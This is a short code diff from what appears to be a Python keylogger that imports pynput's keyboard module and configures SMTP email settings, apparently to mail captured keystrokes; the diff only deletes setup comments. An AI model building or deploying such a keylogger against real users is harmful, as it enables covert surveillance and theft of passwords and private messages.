@@ -5,10 +5,9 @@ import ssl
 
 from pynput import keyboard
 
-# Replace user@domain.com with your email id (everywhere)
+
 sender_mail = "user@domain.com"
-# prefer using your own email id for receiver's as well.
-# Replace user@domain.com with your email id (everywhere)
+
 receiver_mail = "user@domain.com"
 password = "passcode"              # Enter your Password here
 port = 587
